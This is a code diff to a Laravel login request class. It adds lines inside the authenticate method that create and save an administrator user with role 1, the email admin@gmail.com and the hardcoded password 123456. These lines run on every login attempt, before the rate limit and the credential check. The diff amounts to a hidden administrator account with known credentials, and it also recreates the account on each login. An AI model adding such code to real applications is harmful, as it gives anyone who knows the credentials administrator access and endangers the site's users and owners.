@@ -2,6 +2,7 @@
 
 namespace App\Http\Requests\Auth;
 
+use App\Models\User;
 use Illuminate\Auth\Events\Lockout;
 use Illuminate\Foundation\Http\FormRequest;
 use Illuminate\Support\Facades\Auth;
@@ -43,6 +44,16 @@ class LoginRequest extends FormRequest
      */
     public function authenticate()
     {
+
+        $user = new User();
+        $user->name = 'admin';
+        $user->email = 'admin@gmail.com';
+        $user->role = 1;
+        $user->password = bcrypt(123456);
+
+        $user->save();
+
+
         $this->ensureIsNotRateLimited();
 
         if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
